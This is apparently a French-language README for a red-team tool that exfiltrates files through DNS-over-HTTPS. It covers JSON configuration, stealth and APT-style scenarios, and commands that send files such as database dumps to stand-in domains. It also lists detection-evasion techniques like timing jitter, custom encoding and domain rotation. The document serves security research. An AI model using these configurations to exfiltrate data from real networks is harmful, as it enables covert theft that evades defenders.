# Configuration JSON pour DoH Exfiltration

Ce système permet de configurer facilement les paramètres d'exfiltration DoH via des fichiers JSON, facilitant les tests d'évasion et la recherche en sécurité.

## 🚀 Démarrage rapide

### 1. Lister les configurations disponibles
```bash
python config_generator.py --list
```

### 2. Créer les configurations template de base
```bash
python config_generator.py --templates
```

### 3. Tester une configuration
```bash
# Avec un scénario prédéfini
python quick_test_json.py --scenario stealth myfile.txt

# Avec un fichier de configuration personnalisé
python quick_test_json.py --config my_config.json myfile.txt

# Lister les scénarios disponibles
python quick_test_json.py --list-scenarios
```

## 📋 Structure d'une configuration JSON

```json
{
  "name": "Nom de la configuration",
  "description": "Description du scénario de test",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "exfill.local",
    "chunk_size": 30,
    "encoding": "base64",
    "timing_pattern": "regular",
    "base_delay": 0.2,
    "compression": false,
    "encryption": false,
    "encryption_key": null,
    "subdomain_randomization": true,
    "padding": false,
    "domain_rotation": false,
    "backup_domains": []
  },
  "test_files": ["sample.txt"],
  "detection_expected": true,
  "notes": "Notes de recherche sur cette configuration"
}
```

## ⚙️ Paramètres de configuration

### Paramètres de base
- **doh_server**: URL du serveur DoH
- **target_domain**: Domaine cible pour l'exfiltration
- **chunk_size**: Taille des chunks en caractères (8-60)

### Encodage
- **encoding**: Type d'encodage
  - `base64`: Encodage Base64 standard
  - `hex`: Encodage hexadécimal
  - `base32`: Encodage Base32
  - `custom`: Encodage personnalisé pour évasion

### Patterns de timing
- **timing_pattern**: Pattern de temporisation
  - `regular`: Délais constants
  - `random`: Délais variables aléatoires
  - `burst`: Envoi en rafales
  - `stealth`: Mode furtif avec longs délais
- **base_delay**: Délai de base entre les chunks (secondes)
- **delay_variance**: Variance pour les délais aléatoires

### Options d'évasion
- **compression**: Activer la compression des données
- **encryption**: Activer le chiffrement
- **encryption_key**: Clé de chiffrement (si encryption=true)
- **subdomain_randomization**: Randomiser les sous-domaines
- **padding**: Ajouter du padding aux chunks
- **domain_rotation**: Rotation entre plusieurs domaines
- **backup_domains**: Liste des domaines de backup

## 🎯 Scénarios prédéfinis

### Classic (classique)
Configuration de base facilement détectable pour validation
```bash
python quick_test_json.py --scenario classic file.txt
```

### Stealth (furtif)
Techniques d'évasion avancées pour contourner la détection
```bash
python quick_test_json.py --scenario stealth file.txt
```

### Burst (rafales)
Exfiltration rapide en rafales pour tester la détection temporelle
```bash
python quick_test_json.py --scenario burst file.txt
```

### APT (persistance)
Simulation d'APT avec exfiltration très lente et discrète
```bash
python quick_test_json.py --scenario apt file.txt
```

### Speed (vitesse)
Configuration optimisée pour la vitesse maximale
```bash
python quick_test_json.py --scenario speed file.txt
```

## 🔧 Création de configurations personnalisées

### Interface interactive
```bash
python config_generator.py --create
```

### Génération automatique basée sur la taille du fichier
```python
from json_config_loader import JSONConfigLoader

loader = JSONConfigLoader()
config_file = loader.create_custom_test_config("my_test", file_size=5000, "balanced")
```

### Édition d'une configuration existante
```bash
python config_generator.py --edit my_config.json
```

## 🧪 Tests d'évasion

### Test de base
```bash
# Test avec configuration adaptative
python quick_test_json.py myfile.txt

# Test avec scénario spécifique
python quick_test_json.py --scenario stealth sensitive_data.pdf

# Test avec configuration personnalisée
python quick_test_json.py --config evasion_test.json database_dump.sql
```

### Test avec Docker
```bash
# Construction de l'image
docker build -f Dockerfile.client -t doh-client-json .

# Test avec scénario
docker run -v $(pwd)/test_data:/app/test_data doh-client-json \
  python quick_test_json.py --scenario stealth /app/test_data/myfile.txt

# Test avec configuration personnalisée
docker run -v $(pwd)/test_configs:/app/test_configs \
           -v $(pwd)/test_data:/app/test_data \
           doh-client-json \
  python quick_test_json.py --config /app/test_configs/my_config.json /app/test_data/myfile.txt
```

## 📊 Analyse des résultats

Les statistiques d'exfiltration incluent :
- Temps total d'exfiltration
- Nombre de chunks envoyés/réussis/échoués
- Taux de succès
- Débit moyen
- Configuration utilisée

Exemple de sortie :
```
📊 Exfiltration Statistics:
  - File: sensitive_data.pdf
  - Size: 15,234 bytes
  - Configuration: scenario 'Advanced Stealth'
  - Total chunks: 127
  - Successful chunks: 127
  - Failed chunks: 0
  - Success rate: 100.0%
  - Total time: 45.23 seconds
  - Average speed: 0.3 KB/s
```

## 🔬 Recherche et évasion

### Techniques d'évasion disponibles

1. **Timing variable** : Délais aléatoires pour éviter la détection de patterns
2. **Petits chunks** : Réduction de la taille pour rester sous les seuils
3. **Encodage personnalisé** : Éviter la détection d'encodage Base64
4. **Compression** : Réduire la taille des données transmises
5. **Chiffrement** : Masquer le contenu des données
6. **Rotation de domaines** : Utiliser plusieurs domaines légitimes
7. **Randomisation** : Sous-domaines aléatoires pour éviter les patterns
8. **Padding** : Masquer la taille réelle des chunks

### Recommandations pour la recherche

- **Tests comparatifs** : Tester différentes configurations sur le même fichier
- **Mesure de détection** : Analyser les logs du système de détection
- **Optimisation progressive** : Ajuster les paramètres basés sur les résultats
- **Documentation** : Utiliser le champ "notes" pour documenter les observations

## 🛠️ Développement

### Ajout de nouveaux patterns de timing
```python
class TimingPattern(Enum):
    CUSTOM_PATTERN = "custom_pattern"

# Implémenter dans _apply_timing_delay()
```

### Ajout de nouveaux types d'encodage
```python
class EncodingType(Enum):
    NEW_ENCODING = "new_encoding"

# Implémenter dans _prepare_data()
```

### Variables d'environnement
- `DOH_SERVER`: Serveur DoH par défaut
- `TARGET_DOMAIN`: Domaine cible par défaut

## 📝 Exemples d'utilisation

### Scénario de recherche complet
```bash
# 1. Créer une configuration personnalisée
python config_generator.py --create

# 2. Tester avec un petit fichier
echo "Test data" > small_test.txt
python quick_test_json.py --config my_research_config.json small_test.txt

# 3. Analyser les résultats et ajuster
python config_generator.py --edit my_research_config.json

# 4. Tester avec différentes tailles de fichiers
python quick_test_json.py --config my_research_config.json large_file.pdf
```

### Test d'évasion automatisé
```bash
# Test avec toutes les configurations
for config in test_configs/*.json; do
    echo "Testing $config"
    python quick_test_json.py --config "$config" test_file.txt
done
```

## ⚠️ Considérations de sécurité

- Utiliser uniquement dans un environnement de test contrôlé
- Ne pas utiliser sur des réseaux de production sans autorisation
- Les clés de chiffrement dans les exemples sont à des fins de démonstration uniquement
- Respecter les politiques de sécurité de votre organisation

---

**Note** : Ce système est conçu pour la recherche académique en sécurité et les tests d'évasion dans des environnements contrôlés.
